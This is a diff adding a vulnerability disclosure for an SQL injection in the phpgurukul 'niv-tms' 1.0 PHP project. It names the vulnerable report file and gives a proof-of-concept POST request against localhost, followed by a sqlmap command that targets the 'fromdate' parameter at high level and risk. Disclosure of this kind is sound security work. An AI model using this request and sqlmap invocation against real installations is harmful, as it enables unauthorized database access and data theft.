@@ -1,0 +1,44 @@
+BUG_Author:
+heishou 
+Affected versions: 
+1.0 
+niv-tms SQL Injection Vulnerability 
+
+Manufacturer: 
+https://phpgurukul.com 
+Vulnerability Description: 
+Remote attackers could exploit this vulnerability to manipulate SQL queries of Web applications by injecting malicious SQL code.  This can lead to unauthorized access to databases, data theft, data manipulation and other malicious activities. 
+Source code download: 
+https://phpgurukul.com/wp-content/uploads/2023/09/niv-tms-project-php.zip
+ Source Code Audit: 
+ Directly concatenating user input into SQL queries in the niv/nipah-tms/bwdates-report-result.php file further leads to SQL injection attacks: 
+ See documentation for detailed defect codes 
+
+POC：
+POST /niv/nipah-tms/bwdates-report-result.php HTTP/1.1
+Host: localhost
+Content-Length: 51
+Cache-Control: max-age=0
+sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/niv/nipah-tms/bwdates-report-ds.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.; ci_session=3vb42k9s3m0iu7ptfbed07oqah644kor; PHPSESSID=rnl5etfht6ltq81aoghoshm8rt
+Connection: close
+
+fromdate=2023-12-23&todate=2023-12-14&submit=Submit
+
+##
+Sqlmap:
+python sqlmap.py -r 2.txt --level 5 --risk 3 -p fromdate
